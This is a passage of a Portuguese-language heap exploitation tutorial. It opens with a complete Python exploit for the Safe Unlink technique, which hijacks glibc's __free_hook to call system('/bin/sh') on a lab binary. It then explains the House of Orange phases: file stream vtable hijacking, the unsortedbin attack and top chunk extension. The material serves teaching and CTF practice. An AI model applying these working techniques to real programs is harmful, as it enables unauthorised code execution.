<p>Tudo que é preciso fazer, é liberar o <em>chunk</em> zero. A <code class="language-plaintext highlighter-rouge">free hook</code> vai redirecionar a função <code class="language-plaintext highlighter-rouge">free()</code> para a função <code class="language-plaintext highlighter-rouge">system()</code> e o argumento passado para ela, será um <em>pointer</em> para a <em>string</em> “/bin/sh”. Vamos voltar para o script e adicionar a linha que libera o <em>chunk</em> zero, ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># liberando o chunkB e ativando o unlinking dos chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a primeira entrada do m_array com o endereco da free hook - 8 bytes
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>

<span class="c1"># sobrescrevendo o conteudo do endereco com a string "/bin/sh" seguido do endereco da system()
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1"># liberando o chunk 0 e redirecionado a free() para system()
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Agora se executarmos o script em condições de produção, teremos o <code class="language-plaintext highlighter-rouge">shell</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_234.png" alt="Shell obtido" /></p>

<p>E este é um exemplo da técnica <code class="language-plaintext highlighter-rouge">Safe Unlink</code>, o equivalente moderno da técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>. Para conseguirmos o resultado, é preciso ser capaz de retirar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> de um <em>chunk</em> alocado, do qual utilizamos <em>overflow</em> para sobrescrever. Também precisamos saber o endereço de um <em>pointer</em> para um <em>chunk</em>, neste caso em específico, utilizamos um armazenado pelo próprio programa em seu <em>data section</em>.</p>

<h1 id="the-house-of-orange">THE HOUSE OF ORANGE</h1>

<p>Provavelmente uma das técnicas mais complexas existentes, a técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code> foi desnenvolvida em 2016 por <code class="language-plaintext highlighter-rouge">4ngelboy</code> e descrita em seu artigo <code class="language-plaintext highlighter-rouge">HITCON CTF Qual 2016: House of Orange Write up</code>. Esta técnica foi feita com o único intúito de responder com um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>A técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code> pode ser quebrada em três fases, das quais vamos abordar em ordem reversa, para melhor entendimento. Até o momento, utilizamos a <code class="language-plaintext highlighter-rouge">malloc hooks</code> para conseguir um <code class="language-plaintext highlighter-rouge">shell</code>, mas neste momento, vamos cobrir uma nova técnica chamada de <code class="language-plaintext highlighter-rouge">file stream exploitation</code>.</p>

<h2 id="fase-3---file-stream-exploitation">Fase 3 - File Stream Exploitation</h2>

<p>Até o momento, exploramos a <code class="language-plaintext highlighter-rouge">malloc hooks</code> para conseguir um <code class="language-plaintext highlighter-rouge">shell</code>, porém, entre a infinidade de técnicas existentes, temos a chamada “<em>file stream exploitation</em>”, que é uma forma de tomar vantaggem de uma funcionalidade fundamental da GLIBC para, entre outras coisas, obter execução de arbitrária de código.</p>

<p>Quando requisitamos acesso a um arquivo no Linux, este processo é iniciado com um <em>file descriptor</em> ou “fd” (não confundir com “fd” da <em>heap</em> que significa <em>forward pointer</em>).<br />
<em>File descriptors</em> são representados por inteiros positivos que o processo pode utilisar como um identificador para um recurso. Mas, trabalhar com arquivos utilizando <em>file descriptors</em> pode se tornar problemático, pois é possível ler e escrever, mas frequentemente a maneira na qual precisamos lidar com arquivos, é mais sutil.</p>

<p>E é por isso que a GLIBC implementou os <em>file stremas</em>, eles “encapsulam” os <em>file descriptors</em> e oferecem algumas funcionalidades como I/O em <em>buffer</em> e o “desfazer” (<em>undo</em>).<br />
Eles tomam a forma de estruturas <code class="language-plaintext highlighter-rouge">_IO_FILE</code> na memória, e são para elas que funções como <code class="language-plaintext highlighter-rouge">fopen()</code> retornam seus ponteiros.</p>

<p>É possível visualizarmos a estrutura da <code class="language-plaintext highlighter-rouge">_IO_FILE</code> com o próprio GDB. Se carregarmos qualquer binário no GDB, como por exemplo o “/bin/sh” e inserirmos o comando <code class="language-plaintext highlighter-rouge">start</code> para nos certificarmos de carregar todas as bibliotecas, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dt "struct _IO_FILE"</code> para visualizarmos sua estrutura, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_149.png" alt="Estrutura da _IO_FILE" /></p>

<p>Conforme mencionado anteriormente, a estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code> “encapsula” os <em>file descriptors</em>. Podemos ver ilustrado na imagem abaixo que os <em>file streams</em> consistem primordialmente de <em>buffers</em> de caracteres.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_150.png" alt="Buffers de caracteres" /></p>

<p>Estes <em>buffers</em> são utilizados para dar suporte as funcionalidades citadas anteriormente como <em>buffered I/O</em> e <em>undo</em>.</p>

<p>No início da estrutura, temos o membro <code class="language-plaintext highlighter-rouge">_flags</code> que determina o estado do <em>stream</em> do arquivo.<br />
Também existe o membro <code class="language-plaintext highlighter-rouge">_chain</code>, este indica que existe um <em>pointer</em> para outra estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code>, eles formam ligações em uma lista não circular que contém todos os arquivos abertos em um processo.</p>

<blockquote>
  <p>O cabeçalho de uma lista de arquivos abertos contém um símbolo que se chama <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.<br />
Toda vez que um novo arquivo é aberto por uma função como <code class="language-plaintext highlighter-rouge">fopen()</code>, uma estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code> é criada na <em>heap</em> e é ligado ao cabeçalho pela lista <code class="language-plaintext highlighter-rouge">_IO_list_all</code>, muito parecido com uma <em>fastbin</em> para arquivos.</p>
</blockquote>

<p>O membro <code class="language-plaintext highlighter-rouge">_mode</code> pode desabilitar um <em>file stream</em> e seu uso será explorado mais adiante.</p>

<p>Por agora, vamos visualizar a <code class="language-plaintext highlighter-rouge">_IO_list_all</code> com o comando <code class="language-plaintext highlighter-rouge">print _IO_list_all</code>, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_151.png" alt="IO_list_all" /></p>

<p>Podemos notar que o seu <em>type</em> é <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code>. Esta estrutura é só um “encapsulador” da estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code> que adiciona um apontador <code class="language-plaintext highlighter-rouge">vtable</code> para ela. Podemos confirmar com o comando <code class="language-plaintext highlighter-rouge">dt</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_152.png" alt="Estrutura _IO_FILE_plus" /></p>

<h3 id="vtables">Vtables</h3>

<p>As <code class="language-plaintext highlighter-rouge">vtables</code> representam uma forma de implementar polimorfismo em linguagens orientadas a objeto, como C++. Para representar de forma abstrada, vamos fazer a seguinte analogia:</p>

<p>Vamos supor que tenhamos uma <code class="language-plaintext highlighter-rouge">classe</code> chamada “carro”, que por sua vez tenha um método chamado <code class="language-plaintext highlighter-rouge">accelerate()</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_153.png" alt="Classe carro" /></p>

<p>Quando derivamos esta classe para diferentes carros como <code class="language-plaintext highlighter-rouge">Porsche</code> e <code class="language-plaintext highlighter-rouge">Ferrari</code>, podemos querer que estes diferentes carros acelerem de forma diferente, então fazemos com que o método <code class="language-plaintext highlighter-rouge">accelerate()</code> se torne uma função “<em>virtual</em>”, simplesmente permitindo que tanto o <code class="language-plaintext highlighter-rouge">Porsche</code> quanto a <code class="language-plaintext highlighter-rouge">Ferrari</code> possam sobrescrever a função original <code class="language-plaintext highlighter-rouge">accelerate()</code> com suas próprias implementações.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_154.png" alt="Derivando a classe" /></p>

<p>Quando o método <code class="language-plaintext highlighter-rouge">accelerate()</code> é chamado diretamente do objeto <code class="language-plaintext highlighter-rouge">carro</code>, a chamada pode ir diretamente para a versão apropriada do método.</p>

<p>Mas, considere que uma função que tem como como argumento qualquer tipo de carro, então chama o método <code class="language-plaintext highlighter-rouge">accelerate()</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_155.png" alt="Chamando qualquer carro" /></p>

<p>Esta função pode acabar chamando tanto a <code class="language-plaintext highlighter-rouge">accelerate()</code> do <code class="language-plaintext highlighter-rouge">Porsche</code> quanto a da <code class="language-plaintext highlighter-rouge">Ferrari</code>, e não há um jeito no qual o compilador possa dizer qual tipo de carro está sendo usado no momento.</p>

<p>Isto é chamado de “polimorfismo”, e linguagens como C++ frequentemente não especificam como isso pode ser implementado, porém, uma solução é usar as <em>vtables</em>.</p>

<p>Simplificando o máximo possível, o princípio básico é dar para cada classe que usa funções virtuais uma “<em>virtual function table</em>”, ou <em>vtable</em>.</p>

<p>Normalmente, existe apenas uma <em>vtable</em> por classe, e cada objeto instanciado desta classe recebe um <em>pointer</em> para sua <em>vtable</em> correspondente. Por exemplo, nosso <code class="language-plaintext highlighter-rouge">Porsche</code> e nossa <code class="language-plaintext highlighter-rouge">Ferrari</code> podem ter uma <em>vtable</em> como a da imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_156.png" alt="Vtables" /></p>

<p>A terceira entrada na <em>vtable</em> do <code class="language-plaintext highlighter-rouge">Porsche</code> aponta para a <code class="language-plaintext highlighter-rouge">accelerate()</code> do <code class="language-plaintext highlighter-rouge">Porsche</code> e a terceira entrada da <em>vtable</em> da <code class="language-plaintext highlighter-rouge">Ferrari</code> aponta para a <code class="language-plaintext highlighter-rouge">accelerate()</code> da <code class="language-plaintext highlighter-rouge">Ferrari</code><br />
Todos os objetos <code class="language-plaintext highlighter-rouge">Porsches</code> e <code class="language-plaintext highlighter-rouge">Ferraris</code> também possuem um <em>pointer</em> para sua <em>vtable</em>.</p>

<p>Agora, quando a função descrita anteriormente precisar chamar a versão correta do método <code class="language-plaintext highlighter-rouge">accelerate()</code> de algum carro, tudo que precisa fazer é seguir o <em>pointer</em> da <em>vtable</em> do objeto e chamar a terceira entrada desta <em>vtable</em>.</p>

<p>Quando exploramos binários compilados em C++, existe uma vulnerabilidade chamada “<em>vtable highjacking</em>”.<br />
Explorando esta vulnerabilidade, abusamos do processo de sobrescrever o <em>pointer</em> de uma <em>vtable</em> de um objeto utilizando algum <em>bug</em> como <em>overflow</em>, então o apontamos para uma <em>vtable</em> falsa que tenhamos controle, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_157.png" alt="Apontando objeto para vtables falsa" /></p>

<p>Neste cenário, podemos configurar a terceira entrada da nossa <em>vtable</em> falsa para o endereço de um <em>gadget</em>, então, da próxima vez que o método <code class="language-plaintext highlighter-rouge">accelerate()</code> deste objeto for chamado, conseguimos um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<blockquote>
  <p>Contextualizando em nosso cenário atual, as bibliotecas GNU C e C++ estão ligadas no Linux.<br />
Se debugarmos um programa C++ no Linux, vamos perceber que junto a biblioteca padrão C++, a biblioteca padrão C também será carregada.<br />
Isto acontece porque a biblioteca GNU C++ utiliza algumas funcionalidades de baixo nível da biblioteca C ao invés de reimplementá-las.<br />
Por exemplo, se debugarmos um programa em C++ que abre um arquivo, e setarmos um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">fopen()</code> da biblioteca C, perceberemos que a biblioteca padrão C++ está, na verdade, chamando a biblioteca padrão C para prformar as operações em baixo nível.<br />
Isto também acontece nos métodos C++ <code class="language-plaintext highlighter-rouge">like_shared()</code> e <code class="language-plaintext highlighter-rouge">make_unique()</code>, dos quais ambos utilizam as funções <code class="language-plaintext highlighter-rouge">malloc</code> da biblioteca padrão C em <em>background</em>.</p>
</blockquote>

<p>No caso da estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code>, ela recebe um <em>pointer</em> na <em>vtable</em> compatível com a classe <code class="language-plaintext highlighter-rouge">streambuf</code> do C++, e por esta razão, isto torna os <em>file streams</em> da GLIBC vuneráveis a <em>vtable hihjacking</em>, uma forma de <em>file stream exploitation</em>.</p>

<p>Portanto <em>file streams</em> são alvos valiosos, e uma vez que um novo <em>file stream</em> é criado dentro de uma <em>heap</em>, ele é potencialmente vulnerável a diferentes classes de <em>bugs</em>, como <em>overflow</em> e <em>double free</em> que já exploramos anteriormente.</p>

<p>Porém, diferente do que aparenta, não precisamos que um arquivo seja aberto para explorar esta vulnerabilidade. Pois qualquer processo que utilize a biblioteca GNU C, sempre terá ao menos três <em>file streams</em> conhecidos como <em>I/O file streams</em> padrões:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">stdin</code></li>
  <li><code class="language-plaintext highlighter-rouge">stdout</code></li>
  <li><code class="language-plaintext highlighter-rouge">stderr</code></li>
</ul>

<p>Mesmo um programa que não imprime nenhuma saída ou que não aceite nenhum comando de entrada, terá os <em>I/O file streams</em> padrões presentes no <em>data section</em> na GLIBC.<br />
E a mesma coisa se repete em programas mais complexos que utilizam GUI. Podemos comprovar isto abrindo o navegador <code class="language-plaintext highlighter-rouge">Firefox</code> e atrelando seu PID ao GDB com o comando <code class="language-plaintext highlighter-rouge">gdb --pid $(pgrep firefox)</code> e imprimindo o valor do cabeçalho da <code class="language-plaintext highlighter-rouge">_IO_list_all</code> conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_158.png" alt="_IO_list_all do Firefox" /></p>

<p>Como podemos ver, <code class="language-plaintext highlighter-rouge">stderr</code> foi o ultimo arquivo a ser aberto representado pelo <code class="language-plaintext highlighter-rouge">stderr file stream</code>. Seguindo o <em>pointer</em> <code class="language-plaintext highlighter-rouge">_chain</code> deste <em>file stream</em> nos leva ao <code class="language-plaintext highlighter-rouge">stdout file stream</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_159.png" alt="Seguindo o file stream" /></p>

<p>E seguindo novamente, somos levados ao <code class="language-plaintext highlighter-rouge">stdin file stream</code>, onde a sequência termina, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_160.png" alt="Seguindo o file stream" /></p>

<p>O comando <code class="language-plaintext highlighter-rouge">xinfo</code> nos mostra que o <code class="language-plaintext highlighter-rouge">stdout file stream</code>, representado pela estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code> se encontra no <em>data section</em> da GLIBC, assim como <code class="language-plaintext highlighter-rouge">stdin</code> e <code class="language-plaintext highlighter-rouge">stderr</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_161.png" alt="Stdout na GLIBC" /></p>

<p>Portanto, mesmo que um binário não abra nenhum arquivo, ou utilize nenhum dos <em>I/O file streams</em> padrões, eles ainda estarão presentes para podermos utilizar técnicas de <em>file stream exploitation</em>.</p>

<p>Esta técnica pode se tornar um “coringa” no uso de diversas formas de dexploração da memória <em>heap</em>.</p>

<h2 id="fase-2---unsortedbin-attack">Fase 2 - Unsortedbin Attack</h2>

<p>Para entendermos esta fase da exploração, precisamos entender o relacionamento entre o <em>unsortedbin</em> e a arena.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_235.png" alt="Destino de um chunk" /></p>

<p>Sabemos que existem vários destinos que um <em>chunk</em> pode adotar quando é liberado. Se ele se qualifica para os <em>fastbins</em> ele é ligado diretamente na lista dos <em>fastbins</em>. Se ele é grande damis para os <em>fastbins</em>, e é adjacente ao <em>top chunk</em> ou é consolidado com um <em>chunk</em> que é adjacente ao <em>top chunk</em>, ele é consolidado no próprio <em>top chunk</em>. Se ele é grande demais para o <em>fastbins</em> e não é adjacente ao <em>top chunk</em> ele é vinculado ao <em>unsortedbin</em> após a consolidação.</p>

<p>Porém ainda existem mais duas listas que não são populadas diretamente pela função <code class="language-plaintext highlighter-rouge">free()</code>. Os <em>chunks</em> pertencentes ao <em>unsortedbins</em> são movidas para estas duas listas, através de um processo chamado <em>sorting</em>, que ocorre durante uma chamada para a <code class="language-plaintext highlighter-rouge">malloc()</code>. Estes <em>bins</em>  são chamados de <code class="language-plaintext highlighter-rouge">Smallbins</code> e <code class="language-plaintext highlighter-rouge">Largebins</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_236.png" alt="Smallbins e largebins" /></p>

<p>Na estrutura da arena, os <em>smallbins</em>  se iniciam logo após o <em>unsortedbin</em>  e os <em>largebins</em>  se iniciam logo após os <em>smallbins</em>.</p>

<p>Os <em>smallbins</em> são uma colação de de listas duplamente ligadas e circulares. Em uma arena, podem haver 62 <em>smallbins</em> com tamanhos entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x3f0</code> bytes. A estrutura do <em>smallbuins</em> segue o padrão FIFO (“<em>First in First out</em>”) assim como no <em>unsortedbin</em>, porém cada lista dentro do <em>smallbin</em> corresponde a um tamanho específico, assim como no <em>fastbin</em></p>

<p>Os <em>largebins</em>  também são uma coleção de listas duplamente ligadas e circulares, porém estas listas tem um range de tamanhos que podem ser de <code class="language-plaintext highlighter-rouge">0x400</code> bytes para mais.</p>

<p>O processo de <em>sorting</em> responsavel por mover <em>chunks</em> de um <em>unsortedbin</em> até um <em>smallbin</em> ou <em>largebin</em> se inicia quando a malloc procuram por um <em>unsortedbin</em> enquanto tenta ao mesmo tempo atender uma requisição.</p>

<p>Conforme vimos no fluxo do <em>unsafe unlink</em>, novos <em>chunks</em> liberados são adicionados ao topo do <em>unsortedbin</em>, porém, durente as requisições a malloc procura do ultimo para o primeiro. As alocações feitas a partir da <em>unsortedbin</em> precisa compreender o tamanho exato da requisição, por exemplo, uma requisição de <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes e a malloc procurar na <em>unsortedbin</em>, esta só irá retornar quando encontrar um <em>chunk</em> livre com este exato tamanho, mesmo que existam <em>chunks</em> maiores disponíveis.</p>

<p>Durante este processo de procura de um <em>chunk</em> com o tamanho exato da requisição, a malloc acaba passando por vários outros <em>chunks</em> cujo tamanho não corespondem à requisição, estes <em>chunks</em> passam pelo processo de <em>sorting</em> e são ovidos para seus respectivos <em>smallbins</em> e <em>largebins</em>.</p>

<p>O exemplo abaixo, mostra de forma abstrata o que ocorre durante o processo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_237.png" alt="Processo de sorting" /></p>

<p>Supondo que um <em>unsortedbin</em> contenha quatro <em>chunks</em> com tamanhos de <code class="language-plaintext highlighter-rouge">0x100</code>, <code class="language-plaintext highlighter-rouge">0x90</code>, <code class="language-plaintext highlighter-rouge">0x400</code> e <code class="language-plaintext highlighter-rouge">0x230</code> bytes, se fizermos uma requisição de um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes enquanto a <em>smallbin</em> estiver vazia, a malloc irá comaçar a procurar no <em>unsortedbin</em> de trás para frente, seguindo a “bk” do topo da <em>unsortedbin</em> na arena até o ultimo <em>chunk</em> da lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_238.png" alt="Processo de sorting" /></p>

<p>Este <em>chunk</em> não se enquadra no tamanho da requisição, pois não tem <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, então a malloc faz o processo de <em>sorting</em> e move este <em>chunk</em> para o <em>smallbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_239.png" alt="Processo de sorting" /></p>

<p>Então a malloc continua a procura e encontra o <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x400</code> bytes de tamanho, que também não corresponde ao tamanho exato da requisição. Portanto, a malloc faz seu processo de <em>sorting</em> o movendo para o <em>largebins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_240.png" alt="Processo de sorting" /></p>

<p>Então a malloc encontra o <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, que se enquadra no tamanho da requisição, o aloca e termina sua busca.</p>

<p>Quando cada um dos <em>chunks</em> do exemplo passam pelo pelo <em>sorting</em> ou são alocados, eles precisam passar pelo processo de <em>unlinking</em> do <em>unsortedbin</em>.</p>

<p>Nas técnicas de <em>unsafe unlink</em> e <em>safe unlink</em> vimos a macro e função utilizadas no processo de <em>unlinking</em>, mas neste caso, a malloc não precisa utilizar estes recursos, pois a malloc não só sabe qual o <em>bin</em> o <em>chunk</em> que passou pelo o <em>sort</em> ou foi alocado está quando foi desvinculado, como sua própria posição posição, neste caso, o processo de <em>unlinking</em> pode ser simplificado para algo chamado <em>partial unlink</em>.</p>

<p>O processo abaixo, exemplifica de forma abstrata o processo de <em>partial unlink</em></p>

<p><img src="/img/papers/heap_p1/paper_heap1_241.png" alt="Processo de partial unlink" /></p>

<p>O “fd” do <em>chunk</em> vítima sempre será ignorado, pois ele sempre vai apontar para o topo do <em>unsortedbin</em> uma vez que também sempre será o último <em>chunk</em> da lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_242.png" alt="Processo de partial unlink" /></p>

<p>O “bk” do <em>chunk</em> vítima é seguido e o endereço do <em>unsortedbin</em> é copiado sobre o “fd” do <em>chunk</em> encontrado, o que é suficiente para remover o <em>chunk</em> vítima da lista “fd”. O <em>chunk</em> vítima é removido da lista “bk” após copiar seu “bk” sobre o “bk” do <em>unsortedbin</em>.</p>

<p>Do ponto de vista da exploração, o processo de <em>partial unlink</em> nos interassa, é porque este processo não passa por nenhuma checagem de integridade, e isto forma a base do <em>unsortedbin attack</em>.</p>

<blockquote>
  <p>A premissa é simplesmente nos aproveitarmos de um <em>bug</em> para adulterar o “bk” de um <em>chunk</em> do <em>unsortedbin</em> e então ativar o processo de <em>partial unlink</em>. O resultado disso, é que podemos sobrescrever o endereço do <em>unsortedbin</em> para o endereço que quisermos, podendo vazer endereços da arena, ou no caso da técnica <code class="language-plaintext highlighter-rouge">The House od Orange</code>, conseguirmos um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<h2 id="fase-1---top-chunk-extension">Fase 1 - Top Chunk Extension</h2>

<p>Esta fase, pode ser utilizada ou não, dependendo do <em>bug</em> encontrado no programa, porém, conforme descrito no arigo <code class="language-plaintext highlighter-rouge">HITCON CTF Qual 2016: House of Orange Write up</code>, neste exemplo vamos explorar a técnica completa.</p>

<p>No diretório <code class="language-plaintext highlighter-rouge">house_of_force</code> existe um binário com o mesmo nome, do qual podemos checar suas implementações de segurança com o programa <code class="language-plaintext highlighter-rouge">checksec</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_243.png" alt="Implementações do programa" /></p>

<p>Conforme podemos observar, este binário foi compilado com as principais técnicas de mitigação de exploração, <code class="language-plaintext highlighter-rouge">Full RELRO</code>, <code class="language-plaintext highlighter-rouge">Stack Canary</code>, <code class="language-plaintext highlighter-rouge">NX</code> e <code class="language-plaintext highlighter-rouge">PIE protector</code>, além de utilizar a GLIBC na versão 2.23.</p>

<p>A fase um, depende de qual tipo de <em>bug</em> está presente no binário, portanto, podemos enumerá-lo em tempo de execução através do GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_244.png" alt="Carregando o programa no GDB" /></p>

<p>Desta vez, podemos ver os vazamentos de endereço, e o menu com algumas diferenças. Neste binário, podemos solicitar dois <em>small chunks</em> na opção um do menu. Porém, quando solicitamos estes <em>chunks</em> o programa não solicita os dados para preenchê-lo, confomre imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_245.png" alt="Alocando small chunks" /></p>

<p>Pausando a execução no GDB e inspecionando a <em>heap</em>, podemos ver que o programa aloca <em>chunks</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x20</code> bytes com a opção um do menu, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_246.png" alt="Chunks alocados" /></p>

<p>Continuando a execução, na opção dois, podemos solicitar um <em>large chunk</em>. Assim como na opção um, podemos pausar a execução no GDB, e inspecionar o que o programa considera como <em>large</em>. Na imagem abaixo podemos verificar que o programa considera para um <em>large chunk</em> o tamanho de <code class="language-plaintext highlighter-rouge">0xfd0</code> bytes.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_247.png" alt="Chunks alocados" /></p>

<p>Por último, a opção três do menu, nos permite editar específicamente o conteúdo do primeiro <em>small chunk</em> alocado. Podemos preenchê-lo com lixo e inspecionar a <em>heap</em>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_248.png" alt="Primeiro small chunk preenchido" /></p>

<p>Continuando a enumeração, podemos comprovar que o binário possui um <em>bug</em> de <em>heap overflow</em> quando utilizamos a opção <em>edit</em> e enviamos mais dados que um <em>small chunk</em> suporta, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_249.png" alt="Heap overflow" /></p>

<p>Ao inspecionar a <em>heap</em> podemos ver que sobrescrevemos o <em>top chunk size field</em> do segundo <em>small chunk</em>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_250.png" alt="Heap overflow" /></p>

<blockquote>
  <p>Este bug nos mostra que podemos adulterar o <em>top chunk size field</em> nos dois <em>chunks</em> seguintes, porém este <em>bug</em> não significa nada se não encontrarmos uma forma de fazer com que a malloc utilize os dados forjados de alguma forma, pois a única coisa que a malloc pode fazer com um <em>chunk</em> alocado, é liberá-lo.</p>
</blockquote>

<p>Conforme vimos na fase 2 da técnica, iremos utilizar o <em>unsortedbin attack</em>, esta técnica ocorre durante a liberação de um <em>chunk unsorted</em>, porém, no menu do programa não existe a opção <em>free</em>, logo não temos acesso à execução da função <code class="language-plaintext highlighter-rouge">free()</code>.</p>

<p>Precisamos de uma forma de usar o <em>bug</em> de <em>overflow</em> para gerar um <em>chunk</em> livre apenas utilizando chamadas para a função <code class="language-plaintext highlighter-rouge">malloc()</code>. Isto é o que iremos fazer na fase 1 da técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code>.</p>

<p>Na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code> nós sobrescrevemos o <em>top chunk size field</em> com um valor muito grande e vimos o comportamento da malloc nesta situação. Porém, se sobrescrevermos este campo com um valor muito pequeno, a malloc terá um comportamento diferente.</p>

<p>O exemplo abaixo, mostra de forma abstrata o comportamento da malloc quando alteramos o <em>top chunk size field</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_251.png" alt="Aumentando um top chunk size field" /></p>

<p>Quando temos um <em>chunk</em> gerado pela <em>main arena</em> e solicitamos um tamanho maior, como fizemos na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>, a malloc invoca a <em>syscall</em> <code class="language-plaintext highlighter-rouge">brk()</code> para requisitar mais memória do kernal. A malloc utiliza o <em>top chunk size field</em> atual para determinar se a nova memória será adjacente ao final da <em>heap</em>. Se sim, a malloc extende o <em>top chunk</em> até o endereço da memória adicional requisitada e permite a alocação de um <em>top chunk</em> maior, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_252.png" alt="Aumentando um top chunk size field" /></p>

<p>Agora, podemos verificar este mesmo processo, quando solicitamos mais memória após sobrescrevemos o <em>top chunk size field</em> com um valor menor.<br />
